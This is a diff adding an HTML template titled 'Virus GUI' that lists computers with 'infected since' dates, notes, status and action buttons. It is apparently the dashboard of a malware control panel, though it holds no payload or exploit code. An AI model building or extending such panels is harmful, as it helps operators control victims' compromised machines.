@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="templateStatic/home.css">
+    <script src="templateStatic/home.js" defer></script>
+    <title>Virus GUI</title>
+</head>
+<body>
+    <button class="btnDownload"><a href="./favicon.ico" class="textButton">Stáhnout</a></button>
+    <div id="tabulka">
+        <table>
+            <thead>
+               <tr>
+                  <th>id</th>
+                  <th>infected since</th>
+                  <th>notes</th>
+                  <th>name</th>
+                  <th>actions</th>
+                  <th>status</th>
+               </tr>
+            </thead>
+            
+            <tbody>
+               {% for computers in computersdata %}
+                  <tr style="text-align:center;">
+                     <td>{{computers.id}}</td>
+                     <td>{{computers.infrom}}</td>
+                     <td><button class="noteBtn" onclick='bringNotes("{{computers.id}}")'>Notes</button></td>
+                     <td>{{computers.uname}}</td>
+                     <td>{%if computers.status == False%}
+                        <button class="actButton" disabled>Actions</button>
+                        {%else%}
+                        <button class="actButton" onclick="bringUp('{{computers.id}}')">Actions</button>
+                        {%endif%}
+                     </td>
+                     <td>
+                        {%if computers.status == True%}
+                        <p class="Active">Enabled</p>
+                        {%else%}
+                        <p class="notActive">Disabled</p>
+                        {%endif%}
+                     </td>
+                  </tr>
+               {% endfor %}
+            </tbody>
+         </table>
+    </div>
+</body>
+</html>
